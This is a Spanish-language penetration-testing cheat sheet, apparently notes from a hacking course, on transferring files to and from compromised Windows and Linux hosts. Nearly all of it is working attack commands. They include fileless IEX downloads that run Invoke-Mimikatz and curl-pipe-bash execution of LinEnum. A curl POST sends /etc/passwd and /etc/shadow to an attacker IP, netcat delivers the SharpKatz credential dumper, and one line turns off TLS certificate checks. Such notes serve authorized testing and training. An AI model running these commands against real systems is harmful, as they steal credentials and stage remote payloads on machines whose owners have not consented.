#fileTransfer
## **Windows**
### Descargar Archivos 
#### Decodificar en base64
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tL...<SNIP>...LS0tLQo="))
```
Comprobar md5 del archivo
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

#### Powershell - Web Downloads
##### Descargar un fichero - DownloadFile
```powershell
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```
##### Método Fileless - DownloadString
Para que sea fileless (ejecutarse directamtente sin descargar en memoria), podemos añadir `IEX` delante de la instrucción de descarga ó pasarselo como pipe (`COMANDO_A_EJECUTAR | IEX`)
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

```
##### Invoke-WebRequest
Más moderno que los anteriores, permite manejar encabezados, códigos de respueta y cuerpo de la respuesta, aunque es algo más lento
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
###### Bypasear errores en la Invoke-WebRequest
- Internet Explorer previene la descarga de archivos
	- **Error:** (`Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1`): 
	- **Solución**: Añadir la flag `-UserBasicParsing`
	```powershell
	 Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing
	```
- El certificado no es de confianza. 
	- **Error**: Could not establish trust relationship for the SSL/TLS secure channel
	- **Solución**: Antes de descargar ejecutar lo siguiente: 
		```powershell
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
		```
#### **SMB**
#### Con copy
```powershell
copy \\192.168.220.133\share\nc.exe C:\Users\Public\nc.exe /user:<usuario> <contraseña>
```
Si el servidor está montado sin user/pass podremos acceder sin añadir `/user:<usuario> <contraseña>`
#### Montando SMB (mapeando en realidad)
```powershell
net use n: \\192.168.220.133\share /user:test test
```

#### **FTP** - Descarga de archivo  
##### Con DownloadFile - Sin credenciales
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
##### ##### Con DownloadFile - Con credenciales
```powershell
$ftp = "ftp://192.168.1.10/reporte.txt" 
$dest = "C:\ruta_local\reporte.txt" 
$webclient = New-Object System.Net.WebClient 
$webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous@example.com") 
$webclient.DownloadFile($ftp, $dest)
```
O con un onliner
```powershell
(New-Object System.Net.WebClient).DownloadFile("ftp://192.168.1.10/reporte.txt", "C:\ruta_local\reporte.txt", (New-Object System.Net.NetworkCredential("anonymous", "anonymous@example.com")))

```

##### Sin shell interactiva - Sin intervención del usuario
Un archivo ftpcommand.txt podría tener la siguiente información
```textplain
open 192.168.1.10
USER anonymous
PASS anonymous@example.com
binary
GET archivo_remoto.txt
PUT archivo_local.txt
bye
```
En la máquina víctima
```powershell
ftp -v -n -s:ftpcommand.txt
```
`-v` para verbose, `-n` para auto-login (desactiva inicio de sesión automático) y `-s:archivo` (Script File)   
#### WinRM
```powershell
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

### **Subir Archivos**

#### **PowerShell Base64 Encode**
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

#### PowerShell - Web Uploads
##### PsUpload
Podemos utilizar el script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) , que acepta los parámetros `-File` y `-Uri`
```powershell
# Descargamos el archivo
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
# Cargamos el archivo en el contexto actual de la sesión PS con dot-sourcing
. .\psupload.ps1
# Ejecutamos la subida
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
##### PowerShell Base64 
Otra forma es envíar el contenido del archivo con una solicitud POST utilizando `Invoke-WebRequest` or `Invoke-RestMethod` 
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
###### Recibir la solicitud - pwnbox
```bash
nc -lvnp 8000 
# Tras copiar el contenido: 
echo <base64> | base64 -d -w 0 > hosts
```

#### SMB
```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
En ocasiones, si Windows no encuentra el protocolo SMB disponible, intenta utilizar WebDAV  como alternativa en los puertos 80 ó 443

#### FTP 
##### Con UploadFile
```powershell
`(New-Object System.Net.WebClient).UploadFile("ftp://192.168.1.10/datos.txt", "C:\ruta_local\datos.txt", (New-Object System.Net.NetworkCredential("anonymous", "anonymous@example.com")))`
```
##### Sin shell interactiva
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```
#### WinRM
```powershell
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---
## Linux

### Base64 Encode/decode
```bash
md5sum id_rsa
cat id_rsa | base64 -w 0;echo
echo -n 'LS0tLS...<SNIP>...S0tLQo=' | base64 -d > id_rsa
md5sum id_rsa # para verificar que el archivo está intacto
```
### Descargar archivos
#### cURL
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
Método Fileless
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
#### Wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
Método Fileless
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
`-q` quiet (reduce la salida de mensajes al mínimo) y `-O-` salida por `stdout` en lugar de archivo (en este caso, `-` significa stdout)
#### Bash (/dev/tcp)
Para versiones de bash superiores a la `2.04` podemos ejecutar lo siguiente: 
```bash
# Creamos descriptor de archivo
exec 3<>/dev/tcp/10.10.10.32/80
# Envíar HTTP GET Request al descriptor de archivo
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
# Escribir la respuesta
cat <&3
#exec 3<&- # Cierra el descriptor de archivo 3
```

#### SSH - SCP
Debe estar habilitado en nuestra `pwnbox` ssh
```bash
sudo systemctl enable ssh
scp [opciones] origen destino
```
### Subir archivos 
#### cURL + POST - HTTP
```bash
curl -X POST http://192.168.49.128:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
```
#### cURL + POST - HTTPs
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
### Crear Servidor para transferir archivos
#### HTTP/HTTPS 
##### Envíar archivos - `http.server` - python3
```
python -m http.server
```
##### Envíar/recibir: `uploadserver` HTTP
Sirve por defecto en el endpoint `/upload`. No hay funcionalidad  en `http.server` que no esté cubierta por `uploadserver`
```bash
python -m uploadserver
```

##### Envíar/recibir: `uploadserver` HTTPS
Creamos un certificado autofirmado: 
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
Y lanzamos nuestro web server añadiendo la flag `--server-certificate` . El servidor web no debe alojar el certificado autofirmado. 
```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

##### Web server con otros
-  Python2.7
	```bash
	python2.7 -m SimpleHTTPServer
	```
- PHP
	```bash
	php -S 0.0.0.0:8000
	```
- Ruby
	```
	ruby -run -ehttpd . -p8000
	```
#### FTP
```
sudo python3 -m pyftpdlib --port 21
```
#### SMB
##### Impacket-smbserver - Sin user-pass
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
Crea el recurso `share`
##### Impacket-smbserver - Con credenciales
```bash
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
##### Con powershell
```bash
New-SmbShare -Name "share" -Path "C:\Users\Public\share" -FullAccess Everyone
```
#### WebDAV - `wsgidav`
Si Windows no encuentra el protocolo SMB disponible, intenta utilizar WebDAV  como alternativa en los puertos 80 ó 443. Útil para bypassear bloqueos en el puerto 445
##### Puerto 80 - Sin credenciales
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
##### Puerto 80 - Con credenciales
Crear archivo con usuarios autorizados para acceder al servidor
```bash
sudo htpasswd -c /etc/wsgidav.password user1
```
Ejecutar wsgidav especificcando el archiov de configuración
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth-conf=/etc/wsgidav.password
```
##### Puerto 443
Creamos certificado autofirmado: 
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048  -keyout server.key -out server.crt -subj "/C=US/ST=State/L=City/O=Organization/CN=yourdomain.com"
```
Compartimos el contenido
```bash
sudo wsgidav --host=0.0.0.0 --port=443 --root=/tmp --ssl-cert=server.crt --ssl-key=server.key
```
#### RDP
##### Montar carpeta con `redesktop`
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
##### Montar carpeta con xfreerdp
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
## Con código

### Descarga
#### Python 2
```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Python 3
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### PHP - `File_get_contents()`
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
#### PHP - `Fopen()`
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
#### PHP - `Fileless`
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
#### Ruby
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
#### Perl
```bash
 perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
#### Javascript (`cscritp.exe` Windows)
Primero hay que crear un archivo `wget.js` con el siguiente contenido: 
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
Después utilzamos `cscript.exe`, que es nativo de Windows, del siguiente modo:
```powershell
cscript.exe script.js
```
#### VBScritp (`cscritp.exe` Windows)
Debemos crear un archivo ,p.ej: `wget.vbs`, con el siguiente contenido
```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
### Subida
#### Python 3
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
#### Python 2
```bash
python2.7 -c 'import urllib, urllib2; url = "http://target.com/upload"; file_path = "file_to_upload.txt"; with open(file_path, "rb") as f: data = {"file": f.read()}; req = urllib2.Request(url, urllib.urlencode(data)); urllib2.urlopen(req)'
```
#### PHP - `cURL` 
```bash
php -r '$ch = curl_init(); $data = array("file" => new CURLFile("file_to_upload.txt")); curl_setopt($ch, CURLOPT_URL, "http://target.com/upload"); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_exec($ch); curl_close($ch);'
```
#### PHP - Fileless
```bash
php -r '$url = "http://target.com/upload"; $file = "file_to_upload.txt"; $data = array("file" => new CURLFile($file)); echo file_get_contents($url, false, stream_context_create(array("http" => array("method" => "POST", "content" => http_build_query($data)))));'
```
#### Perl
```bash
perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new; my $url = "http://target.com/upload"; my $file = "file_to_upload.txt"; my $res = $ua->post($url, Content_Type => "form-data", Content => [ file => [$file] ]); print $res->content;'
```
#### Vbasic - `cscript.exe` Windows
Creamos archivo llamado `upload.vbs`
```vb
dim http: Set http = createobject("Microsoft.XMLHTTP")
dim stream: Set stream = createobject("Adodb.Stream")
http.Open "POST", WScript.Arguments.Item(0), False
stream.Type = 1
stream.Open
stream.LoadFromFile WScript.Arguments.Item(1)
http.Send stream.Read
```
Ejecutamos el script
```bash
cscript.exe upload.vbs "http://target.com/upload" "file_to_upload.txt"
```
---

## Con netcat
### Escucha en la máquina comprometida
#### Máquina comprometida
```bash
#utlizando el netcat original
nc -l -p 8000 > SharpKatz.exe
# utilizando ncat, hay que añadir una flag adicional
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
#### Máquina atacante
```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
#Ejemplo con nc original
nc -q 0 $target 8000 < SharpKatz.exe
# Example using Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
Podemos optar por `--send-only` (indica que finalece la escucha una vez agote la entrada) en lugar de `-q` ( `-q x` espera `x` segundos antes de cerrar la conexión)
### Conexión desde la máquina comprometida
#### Máquina atacante
```bash
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Máquina comprometida - con netcat
```bash
# Example using Original Netcat
nc 192.168.49.128 443 > SharpKatz.exe
# Example using Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
## Con `/dev/tcp`
### Envíar archivo
```bash
cat prueba.txt > /dev/tcp/0.0.0.0/4444
```
### Recibir archivo
```bash
cat < /dev/tcp/<ip_servidor>/4444 > archivo_recibido
```

---
## Living off the land
Este concepto es acuñado a los archivos que puede utilizar un atacante para realizar acciones que van más allá de su propósito general.
Actualmente hay dos sitios web que recopilan información sobre los archivos binarios Living off the Land:
- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)